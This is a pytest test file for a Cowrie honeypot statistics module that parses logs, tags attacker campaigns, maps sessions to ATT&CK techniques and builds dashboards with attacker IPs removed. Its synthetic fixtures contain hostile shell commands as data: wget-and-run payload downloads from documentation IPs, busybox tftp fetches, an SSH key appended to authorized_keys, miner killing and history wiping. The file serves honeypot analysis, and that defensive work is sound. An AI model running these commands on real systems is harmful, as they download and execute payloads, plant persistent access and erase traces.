"""Tests for stats.py, using synthetic Cowrie events.

All IPs are from the reserved documentation ranges (RFC 5737), never real attacker data.
"""

import json

import stats

SCANNER, BRUTER, BOT, ME = "203.0.113.1", "203.0.113.2", "203.0.113.3", "198.51.100.9"


def ev(session, ip, eventid, ts="2026-11-06T03:18:55Z", **extra):
    return {"session": session, "src_ip": ip, "eventid": eventid, "timestamp": ts,
            "protocol": extra.pop("protocol", "telnet"), "uuid": "same-sensor-id", **extra}


def write_log(tmp_path, events, name="cowrie.json", extra_lines=()):
    lines = [json.dumps(e) for e in events] + list(extra_lines)
    (tmp_path / name).write_text("\n".join(lines) + "\n", encoding="utf-8")


def sample_events():
    events = [ev("s1", SCANNER, "cowrie.session.connect", protocol="ssh")]
    events += [ev("s2", BRUTER, "cowrie.login.failed", username="root", password=f"pw{i}")
               for i in range(6)]
    events += [
        ev("s3", BOT, "cowrie.login.success", username="admin", password="admin"),
        ev("s3", BOT, "cowrie.command.input", input="cat /proc/self/exe"),
        ev("s3", BOT, "cowrie.command.input", input="wget http://x/y -O- > w; chmod 777 w"),
        ev("s3", BOT, "cowrie.session.file_download", url="http://x/y", shasum="ab" * 32),
        ev("s4", BOT, "cowrie.login.success", username="admin", password="admin"),
        ev("s5", ME, "cowrie.login.success", username="test", password="test"),
    ]
    return events


def sessions_from(tmp_path, own_ips=frozenset({ME})):
    write_log(tmp_path, sample_events())
    return stats.load_sessions(tmp_path, set(own_ips))


# ---------------------------------------------------------------- parsing

def test_own_ips_are_excluded(tmp_path):
    sessions = sessions_from(tmp_path)
    assert ME not in {s["ip"] for s in sessions.values()}
    assert len(sessions) == 4


def test_dedupes_lines_across_rotated_files_despite_shared_uuid(tmp_path):
    events = sample_events()
    write_log(tmp_path, events)
    write_log(tmp_path, events, name="cowrie.json.2026-11-06")  # same lines in a rotated copy
    sessions = stats.load_sessions(tmp_path, {ME})
    assert sessions["s2"]["failed_logins"] == 6  # not 12, and not 1 (uuid is the same everywhere)


def test_skips_malformed_and_non_object_lines(tmp_path):
    write_log(tmp_path, sample_events(), extra_lines=['{"truncated": ', "[1, 2]", "42"])
    assert len(stats.load_sessions(tmp_path, {ME})) == 4


# ---------------------------------------------------------------- classification

def test_tiers(tmp_path):
    s = sessions_from(tmp_path)
    assert [stats.tier(s[k]) for k in ("s1", "s2", "s3", "s4")] == \
        ["scan", "login-attempt", "hands-on", "access"]


def test_brute_force_needs_threshold(tmp_path):
    s = sessions_from(tmp_path)
    brute = stats.brute_force_ips(s)
    assert BRUTER in brute  # 6 failures >= 5
    one_failure = {"x": {**s["s2"], "ip": "203.0.113.50", "failed_logins": 1}}
    assert stats.brute_force_ips(one_failure) == set()


def test_attack_mapping(tmp_path):
    s = sessions_from(tmp_path)
    brute = stats.brute_force_ips(s)
    assert "T1110 Brute Force" in stats.techniques(s["s2"], brute)
    bot = stats.techniques(s["s3"], brute)
    assert {"T1078 Valid Accounts", "T1059.004 Unix Shell", "T1082 System Information Discovery",
            "T1105 Ingress Tool Transfer", "T1222.002 Linux File Permissions Modification"} <= bot
    assert "T1110 Brute Force" not in bot
    assert stats.techniques(s["s1"], brute) == set()  # a scan maps to nothing


def test_attack_rules_avoid_obvious_false_positives():
    quiet = {"ip": "203.0.113.9", "login_ok": True, "failed_logins": 0,
             "commands": ["echo unamed", "ls -la /tmp/curly"]}
    found = stats.techniques(quiet, set())
    assert "T1082 System Information Discovery" not in found
    assert "T1105 Ingress Tool Transfer" not in found


# ---------------------------------------------------------------- metrics & outputs

def test_summary_counts(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={BOT: "Testland", BRUTER: "Exampleland"},
                        today="2026-11-06")
    assert m["connections"] == 4 and m["scans"] == 1
    assert m["attacker_sessions"] == 3 and m["attacker_ips"] == 2
    assert m["hands_on"] == 1 and m["logins_ok"] == 2
    assert m["samples"] == 1 and m["countries"] == 2


def test_history_replaces_same_day_and_keeps_old_schema(tmp_path):
    path = tmp_path / "history.csv"
    path.write_text("date,days,sessions\n2026-11-05,1,8\n", encoding="utf-8")
    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
    stats.update_history(m, path)
    rows = stats.update_history(m, path)  # second run, same day
    assert [r["date"] for r in rows] == ["2026-11-05", "2026-11-06"]


def test_campaign_id_groups_bots_that_only_differ_by_download_server():
    a = {"commands": ["enable", "wget http://192.0.2.10/x -O- > w", "busybox tftp -g 192.0.2.10"]}
    b = {"commands": ["enable", "wget http://192.0.2.99/x -O- > w", "busybox tftp -g 192.0.2.99"]}
    c = {"commands": ["uname -a", "cat /proc/cpuinfo"]}
    assert stats.campaign_id(a) == stats.campaign_id(b)
    assert stats.campaign_id(a) != stats.campaign_id(c)
    assert stats.campaign_id({"commands": []}) is None


def test_campaign_size_counts_ips_not_retries(tmp_path):
    script = ["enable", "system", "shell", "sh"]
    retry = {f"r{i}": {"ip": "203.0.113.7", "commands": script} for i in range(15)}  # one stuck bot
    two = {f"t{i}": {"ip": f"203.0.113.{20 + i}", "commands": ["uname -a"]} for i in range(2)}
    sessions = {k: {"protocol": "telnet", "start": "2026-11-06T05:46:33Z", "login_ok": True,
                    "failed_logins": 0, "creds": [("root", "x")], "downloads": [], "events": 5, **v}
                for k, v in {**retry, **two}.items()}
    m = stats.summarize(sessions, geo={}, today="2026-11-06")
    assert m["campaigns"] == 2
    assert m["top_campaign_ips"] == 2  # the 15-session retry loop is 1 device, not 15


def test_backup_zips_all_logs(tmp_path):
    import zipfile
    write_log(tmp_path, sample_events())
    write_log(tmp_path, sample_events(), name="cowrie.json.2026-11-05")
    target = stats.backup_logs(tmp_path, tmp_path / "backup")
    with zipfile.ZipFile(target) as zf:
        assert sorted(zf.namelist()) == ["cowrie.json", "cowrie.json.2026-11-05"]
    assert not (tmp_path / "backup" / "cowrie-logs.zip.tmp").exists()


def test_is_stale():
    rows = [{"connections": "10"}, {"connections": "10"}, {"connections": "10"}]
    assert stats.is_stale(rows, days=2)
    assert not stats.is_stale(rows[:2], days=2)  # not enough history yet
    assert not stats.is_stale([{"connections": "9"}, *rows[1:]], days=2)


def test_clean_neutralizes_markdown_and_newlines():
    out = stats.clean("a|b`c[[x]]<script>\n# head")
    for bad in "|`[]<>\n#":
        assert bad not in out
    assert stats.clean("x" * 200, limit=10).endswith("…")


def test_alert_adds_one_todo_item_per_day(tmp_path, monkeypatch):
    monkeypatch.setattr(stats, "RUN_LOG", tmp_path / "runs.log")
    (tmp_path / "todo.md").write_text("# Todo\n", encoding="utf-8")
    cfg = stats.Config(host="h", own_ips=set(), log_dir=tmp_path, vault_dir=tmp_path, key="k")
    stats.alert(cfg, "VM unreachable")
    stats.alert(cfg, "VM unreachable")  # same alert again the same day
    todo = (tmp_path / "todo.md").read_text(encoding="utf-8")
    assert todo.count("VM unreachable") == 1
    assert "ALERT VM unreachable" in (tmp_path / "runs.log").read_text(encoding="utf-8")


def test_public_readme_block_has_no_attacker_ips(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
    block = stats.render_public(m, [{"date": "2026-11-06", "attacker_sessions": "3"}])
    for ip in (SCANNER, BRUTER, BOT, ME):
        assert ip not in block


def test_alert_does_not_repeat_on_later_days_while_still_open(tmp_path, monkeypatch):
    monkeypatch.setattr(stats, "RUN_LOG", tmp_path / "runs.log")
    (tmp_path / "todo.md").write_text("# Todo\n- [ ] ⚠️ **Honeypot (2026-11-01):** git push failed\n",
                                      encoding="utf-8")
    cfg = stats.Config(host="h", own_ips=set(), log_dir=tmp_path, vault_dir=tmp_path, key="k")
    stats.alert(cfg, "git push failed")
    assert (tmp_path / "todo.md").read_text(encoding="utf-8").count("git push failed") == 1


def test_plural_handles_y_endings():
    assert stats.plural(3, "country") == "3 countries"
    assert stats.plural(1, "country") == "1 country"
    assert stats.plural(2, "day") == "2 days"


def test_dashboard_data_has_no_attacker_ips_or_commands(tmp_path):
    sessions = sessions_from(tmp_path)
    m = stats.summarize(sessions, geo={BOT: "Testland"}, today="2026-11-06")
    data = stats.render_dashboard(m, [{"date": "2026-11-06", "attacker_sessions": "3", "attacker_ips": ""}])
    text = json.dumps(data)
    for ip in (SCANNER, BRUTER, BOT, ME):
        assert ip not in text
    for s in sessions.values():
        for cmd in s["commands"]:
            assert json.dumps(cmd)[1:-1] not in text
    assert data["history"][0]["attacker_ips"] is None  # blank history cells become null, not a crash
    assert data["funnel"] == {"connections": 4, "scans": 1, "tried_login": 3, "shell": 1}


# ---------------------------------------------------------------- dashboard aggregations

def test_countries_count_unique_ips_and_keep_sessions(tmp_path):
    events = [ev(f"n{i}", BOT, "cowrie.login.success", username="a", password="a") for i in range(5)]
    events += [ev("o1", BRUTER, "cowrie.login.success", username="a", password="a"),
               ev("o2", "198.51.100.9", "cowrie.login.success", username="a", password="a")]
    write_log(tmp_path, events)
    s = stats.load_sessions(tmp_path, set())
    m = stats.summarize(s, geo={BOT: "Noisyland", BRUTER: "Quietland", "198.51.100.9": "Quietland"},
                        today="2026-11-06")
    assert m["_countries"] == {"Quietland": 2, "Noisyland": 1}       # unique IPs: the noisy bot is one IP
    assert m["_country_sessions"] == {"Noisyland": 5, "Quietland": 2}


def test_daily_activity_is_per_day_not_cumulative_and_fills_quiet_days(tmp_path):
    events = [ev("d1", BOT, "cowrie.login.success", ts="2026-11-06T01:00:00Z", username="a", password="a"),
              ev("d2", BOT, "cowrie.login.success", ts="2026-11-06T02:00:00Z", username="a", password="a"),
              ev("d3", BOT, "cowrie.login.success", ts="2026-11-08T01:00:00Z", username="a", password="a"),
              ev("d4", BRUTER, "cowrie.login.success", ts="2026-11-08T01:00:00Z", username="a", password="a")]
    write_log(tmp_path, events)
    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-08")
    assert m["_daily"] == [{"date": "2026-11-06", "sessions": 2, "new_ips": 1},
                           {"date": "2026-11-07", "sessions": 0, "new_ips": 0},
                           {"date": "2026-11-08", "sessions": 2, "new_ips": 1}]   # BOT isn't new on the 8th


def test_blank_credentials_display_as_blank():
    assert stats.cred("admin", "") == "admin / (blank)"
    assert stats.cred("", "") == "(blank) / (blank)"
    assert stats.cred("root", "x|y") == "root / x¦y"   # still sanitized


def test_campaign_tags_are_fixed_labels():
    assert stats.campaign_tags("cd /tmp\nwget <url> -O a; chmod +x a; ./a") == ["downloads payload",
                                                                                 "makes file executable"]
    assert stats.campaign_tags("echo ssh-rsa AAA >> ~/.ssh/authorized_keys") == ["adds SSH key"]
    assert stats.campaign_tags("pkill -9 xmrig; history -c")[:2] == ["kills competing miners", "removes logs"]
    assert stats.campaign_tags("uname -s -v -n -r -m") == ["recon only"]
    assert stats.campaign_tags("echo xsec") == ["tests the shell"]
    assert len(stats.campaign_tags("authorized_keys wget <url> passwd crontab history -c chmod +x")) == 3
    hunt = "".join(f">/{d}/.f && chmod 777 /{d}/.f && /{d}/.f\n" for d in ("tmp", "var", "dev"))
    assert stats.campaign_tags("enable\nsystem\nshell\n" + hunt + "/bin/busybox HISILICON") == [
        "hunts for writable folder", "makes file executable", "escapes restricted shell"]
    assert stats.campaign_tags("To: <sip:nm2@nm2>") == ["probes for VoIP (SIP)"]


def test_campaign_details_have_dates_sizes_and_no_commands(tmp_path):
    cmd = "wget http://203.0.113.50/x.sh; sh x.sh"
    events = []
    for i, (ip, ts) in enumerate([(BOT, "2026-11-06T01:00:00Z"), (BOT, "2026-11-07T01:00:00Z"),
                                  (BRUTER, "2026-11-09T01:00:00Z")]):
        events += [ev(f"c{i}", ip, "cowrie.login.success", ts=ts, username="a", password="a"),
                   ev(f"c{i}", ip, "cowrie.command.input", ts=ts, input=cmd)]
    write_log(tmp_path, events)
    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-09")
    [c] = m["_campaign_details"]
    assert (c["ips"], c["sessions"], c["first_seen"], c["last_seen"]) == (2, 3, "2026-11-06", "2026-11-09")
    assert c["tags"] == ["downloads payload"]
    assert "wget" not in json.dumps(c) and "203.0.113.50" not in json.dumps(c)


def test_samples_include_uploads_and_skip_empty_and_tiny_files(tmp_path):
    big, tiny = "cd" * 32, "ef" * 32
    events = [ev("u1", BOT, "cowrie.session.file_upload", shasum=big, filename="sshd"),
              ev("u2", BRUTER, "cowrie.session.file_download", ts="2026-11-07T00:00:00Z", url="http://h/b", shasum=big),
              ev("u3", BOT, "cowrie.session.file_upload", shasum=stats.EMPTY_SHA256, filename="x"),
              ev("u4", BOT, "cowrie.session.file_download", url="", shasum=tiny)]
    write_log(tmp_path, events)
    sizes = {big: 200_000, tiny: 5}
    m = stats.summarize(stats.load_sessions(tmp_path, set()), geo={}, today="2026-11-07", sizes=sizes)
    assert m["samples"] == 1
    [row] = m["_sample_details"]
    assert (row["sha256"], row["sessions"], row["ips"], row["size"], row["first_seen"]) == \
        (big, 2, 2, 200_000, "2026-11-06")


def test_parse_sample_sizes_ignores_non_hash_files():
    listing = f"{'ab' * 32} 1234\nredir_89026b51 1\n{'zz' * 32} 5\n{'cd' * 32} notanumber\n"
    assert stats.parse_sample_sizes(listing) == {"ab" * 32: 1234}


def test_country_code_to_atlas_id_mapping():
    assert stats.atlas_id("NL") == "528"
    assert stats.atlas_id("us") == "840"
    assert stats.atlas_id("FR") == "250"   # France and Norway are the classic Natural Earth id traps
    assert stats.atlas_id("NO") == "578"
    assert stats.atlas_id("TW") == "158"
    assert stats.atlas_id("XK") is None    # Kosovo has no ISO numeric code (and no atlas id)
    assert stats.atlas_id("") is None


def test_every_atlas_country_is_reachable_from_an_iso_code():
    atlas = json.loads((stats.REPO / "docs" / "vendor" / "countries-110m.json").read_text(encoding="utf-8"))
    atlas_ids = {g["id"] for g in atlas["objects"]["countries"]["geometries"] if "id" in g}
    assert len(atlas_ids) >= 170
    assert atlas_ids <= set(stats.ALPHA2_TO_NUMERIC.values())


def test_dashboard_country_rows_carry_atlas_ids(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={BOT: "Netherlands", BRUTER: "Kosovo"},
                        codes={"Netherlands": "NL", "Kosovo": "XK"}, today="2026-11-06")
    rows = {c["name"]: c for c in stats.render_dashboard(m, [])["countries"]}
    assert rows["Netherlands"]["atlas_id"] == "528" and rows["Netherlands"]["ips"] == 1
    assert rows["Kosovo"]["atlas_id"] is None   # listed, just not drawn on the map


def test_rare_techniques_are_flagged_not_common(tmp_path):
    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
    techs = {t["id"]: t for t in stats.render_dashboard(m, [])["techniques"]}
    assert techs["T1078"]["common"] is True and techs["T1078"]["meaning"]
    assert techs["T1105"]["common"] is False


def test_daily_activity_leaves_out_the_day_in_progress(tmp_path):
    events = [ev("p1", BOT, "cowrie.login.success", ts="2026-11-06T01:00:00Z", username="a", password="a"),
              ev("p2", BRUTER, "cowrie.login.success", ts="2026-11-07T01:00:00Z", username="a", password="a")]
    write_log(tmp_path, events)
    attackers = list(stats.load_sessions(tmp_path, set()).values())
    assert [d["date"] for d in stats.daily_activity(attackers, before="2026-11-07")] == ["2026-11-06"]
